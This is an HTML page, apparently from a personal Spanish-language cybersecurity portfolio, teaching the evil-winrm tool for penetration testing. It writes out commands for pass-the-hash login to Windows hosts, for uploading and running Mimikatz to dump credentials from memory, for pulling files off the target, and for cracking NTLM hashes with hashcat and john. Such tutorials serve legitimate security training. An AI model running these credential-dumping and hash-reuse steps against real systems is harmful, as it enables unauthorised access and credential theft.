@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=048bd61e92be9aa0bfb622d9574fcfaee7a3c510">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>🛡️ ¿Qué es evil-winrm y cómo usarlo para pruebas de penetración? | Portfolio de @juanma-cc</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="🛡️ ¿Qué es evil-winrm y cómo usarlo para pruebas de penetración?" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad." />
+<meta property="og:description" content="Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/tools/evilwinrm.html" />
+<meta property="og:url" content="http://localhost:4000/tools/evilwinrm.html" />
+<meta property="og:site_name" content="Portfolio de @juanma-cc" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="🛡️ ¿Qué es evil-winrm y cómo usarlo para pruebas de penetración?" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad.","headline":"🛡️ ¿Qué es evil-winrm y cómo usarlo para pruebas de penetración?","url":"http://localhost:4000/tools/evilwinrm.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Portfolio de @juanma-cc</h1>
+        </a>
+        <h2>Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad.</h2>
+
+        <section id="downloads">
+          
+          
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="️-qué-es-evil-winrm-y-cómo-usarlo-para-pruebas-de-penetración">🛡️ ¿Qué es <code class="language-plaintext highlighter-rouge">evil-winrm</code> y cómo usarlo para pruebas de penetración?</h1>
+
+<p><code class="language-plaintext highlighter-rouge">evil-winrm</code> es una herramienta poderosa, escrita en Ruby, que permite acceder a máquinas Windows remotas mediante <strong>WinRM (Web Remote Management)</strong>. Es una herramienta clave en la caja de herramientas de cualquier profesional de ciberseguridad o auditor de sistemas.</p>
+
+<hr />
+
+<h2 id="-para-qué-sirve">🔧 ¿Para qué sirve?</h2>
+
+<ul>
+  <li>
+    <p><strong>Acceso remoto seguro</strong> a servidores Windows habilitados para WinRM.</p>
+  </li>
+  <li>
+    <p><strong>Autenticación flexible</strong>: soporta credenciales en texto plano o hashes NTLM.</p>
+  </li>
+  <li>
+    <p>Permite:</p>
+    <ul>
+      <li>Ejecutar comandos como si estuvieras en PowerShell.</li>
+      <li>Navegar por el sistema de archivos del objetivo.</li>
+      <li>Subir y bajar archivos.</li>
+      <li>Explorar vulnerabilidades y explotar scripts o aplicaciones web mal configuradas.</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="-cómo-usar-evil-winrm">💻 Cómo usar <code class="language-plaintext highlighter-rouge">evil-winrm</code></h2>
+
+<h3 id="-con-credenciales">✅ Con credenciales</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.1.10 <span class="nt">-u</span> Administrator <span class="nt">-p</span> password123
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-i</code>: IP del servidor objetivo.</li>
+  <li><code class="language-plaintext highlighter-rouge">-u</code>: Nombre de usuario.</li>
+  <li><code class="language-plaintext highlighter-rouge">-p</code>: Contraseña.</li>
+</ul>
+
+<h3 id="-con-hash-ntlm">🔐 Con hash NTLM</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.1.10 <span class="nt">-u</span> Administrator <span class="nt">-H</span> aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-H</code>: Hash NTLM del usuario (<code class="language-plaintext highlighter-rouge">&lt;LM_HASH&gt;:&lt;NTLM_HASH&gt;</code>).</li>
+</ul>
+
+<hr />
+
+<h3 id="️-opciones-adicionales-útiles">🛠️ Opciones adicionales útiles</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Opción</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-s</code></td>
+      <td>Carpeta con scripts Ruby para ejecutar.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-l</code></td>
+      <td>Carpeta local para guardar archivos descargados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-P</code></td>
+      <td>Puerto personalizado (por defecto 5985 para HTTP).</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-ejemplo-práctico">🧪 Ejemplo práctico</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.1.10 <span class="nt">-u</span> Administrator <span class="nt">-H</span> aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+</code></pre></div></div>
+
+<p>Una vez conectado:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w">
+</span></code></pre></div></div>
+
+<hr />
+
+<h2 id="-transferencia-de-archivos">📥 Transferencia de archivos</h2>
+
+<h3 id="descargar-un-archivo-del-servidor">Descargar un archivo del servidor:</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">download</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\secreto.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="subir-un-archivo-desde-tu-máquina">Subir un archivo desde tu máquina:</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">upload</span><span class="w"> </span><span class="nx">/home/kali/archivo.exe</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\</span><span class="w">
+</span></code></pre></div></div>
+
+<hr />
+
+<h2 id="️️-captura-de-hashes-con-evil-winrm">🕵️‍♂️ Captura de hashes con <code class="language-plaintext highlighter-rouge">evil-winrm</code></h2>
+
+<p>Si tienes acceso al sistema, puedes usar <strong>Mimikatz</strong> para extraer hashes de memoria.</p>
+
+<h3 id="pasos-básicos">Pasos básicos:</h3>
+
+<ol>
+  <li>Subir Mimikatz:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload mimikatz_trunk/mimikatz.exe C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</code></pre></div></div>
+
+<ol>
+  <li>Ejecutar Mimikatz:</li>
+</ol>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">
+</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<ol>
+  <li>Comandos dentro de Mimikatz:</li>
+</ol>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">privilege::debug</span><span class="w">
+</span><span class="nx">sekurlsa::logonpasswords</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Esto te mostrará contraseñas en claro, hashes NTLM y más.</p>
+
+<hr />
+
+<h2 id="-reutilizar-hashes-obtenidos">🔁 Reutilizar hashes obtenidos</h2>
+
+<p>Los hashes capturados pueden ser usados con otras herramientas como:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">evil-winrm</code> (como ya vimos).</li>
+  <li>Herramientas de <code class="language-plaintext highlighter-rouge">Impacket</code> (<code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code>, <code class="language-plaintext highlighter-rouge">wmiexec.py</code>, etc.).</li>
+</ul>
+
+<hr />
+
+<h2 id="-cómo-descifrar-hashes-ntlm">🔐 ¿Cómo descifrar hashes NTLM?</h2>
+
+<h3 id="tipos-de-hashes">Tipos de hashes</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Tipo</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>LM Hash</strong></td>
+      <td>Obsoleto, fácil de crackear.</td>
+    </tr>
+    <tr>
+      <td><strong>NTLM Hash</strong></td>
+      <td>Más fuerte, pero también crackeable.</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h3 id="herramientas-recomendadas">Herramientas recomendadas</h3>
+
+<h4 id="1-hashcat">1. <code class="language-plaintext highlighter-rouge">hashcat</code></h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1000 hash.txt /ruta/a/diccionario.txt
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-m 1000</code>: Modo NTLM.</li>
+  <li><code class="language-plaintext highlighter-rouge">hash.txt</code>: Archivo con los hashes.</li>
+  <li><code class="language-plaintext highlighter-rouge">/ruta/a/diccionario.txt</code>: Diccionario de contraseñas.</li>
+</ul>
+
+<h4 id="2-john-the-ripper">2. <code class="language-plaintext highlighter-rouge">john the ripper</code></h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/ruta/a/diccionario.txt hash.txt
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-conclusión">📌 Conclusión</h2>
+
+<p><code class="language-plaintext highlighter-rouge">evil-winrm</code> es una herramienta esencial para profesionales de ciberseguridad, especialmente en entornos Windows. Combina facilidad de uso con potencia, permitiendo tanto acceso remoto como análisis forense y extracción de credenciales.</p>
+
+<p>¡Comparte este contenido y aprendamos juntos! 👨‍💻👩‍💻 #Ciberseguridad #PenTest #EvilWinRM #HashesNTLM #Redes #Cybersecurity #Windows #EthicalHacking</p>
+
+<p><img src="https://www.kali.org/tools/evil-winrm/images/evil-winrm-logo.svg" alt="Evil-WinRM" /></p>
+
+
+      </section>
+    </div>
+  </body>
+</html>
